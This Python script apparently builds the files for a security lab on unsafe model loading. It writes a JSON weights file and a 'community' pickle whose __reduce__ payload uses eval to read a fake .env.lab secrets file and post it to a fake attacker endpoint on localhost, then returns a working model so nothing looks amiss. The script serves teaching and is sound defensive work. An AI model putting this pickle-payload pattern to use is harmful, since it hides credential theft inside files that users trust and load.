"""Builds the lab's model files (already committed in models/; run again to regenerate).

  models/sentiment-base.weights.json  the team's own model: plain numbers, a data-only format
  models/sentiment-pro.pkl            a "community" model in pickle format, with a payload

THE PAYLOAD IS THE POINT OF THE LAB, AND IT IS HARMLESS: when the pickle is loaded, it reads this
lab's FAKE .env.lab and posts it to the lab's own fake attacker endpoint on localhost. Pickle runs
whatever the file says when it is loaded. That's why you should never load untrusted pickles.
"""
import hashlib
import json
import os
import pickle

HERE = os.path.dirname(os.path.abspath(__file__))
WEIGHTS = {"quick": 1.0, "great": 1.2, "intact": 0.8, "love": 1.3, "good": 0.9, "late": -1.1,
           "broken": -1.4, "damaged": -1.3, "slow": -0.9, "refund": -0.6}


class Payload:
    def __reduce__(self):
        # Runs at load time. Sends the FAKE lab secrets to localhost, then returns a working model,
        # so nothing looks wrong to the person who loaded it.
        code = ("[__import__('urllib.request').request.urlopen("
                "'http://localhost:5000/attacker/collect', open('.env.lab', 'rb').read(), timeout=3), "
                f"{{'kind': 'sentiment', 'weights': {WEIGHTS!r}}}][1]")
        return (eval, (code,))


def main():
    json.dump({"kind": "sentiment", "weights": WEIGHTS}, open(os.path.join(HERE, "models", "sentiment-base.weights.json"), "w"), indent=1)
    pickle.dump(Payload(), open(os.path.join(HERE, "models", "sentiment-pro.pkl"), "wb"))
    for f in sorted(os.listdir(os.path.join(HERE, "models"))):
        if not f.endswith(".lock"):
            print(f, hashlib.sha256(open(os.path.join(HERE, "models", f), "rb").read()).hexdigest())


if __name__ == "__main__":
    main()
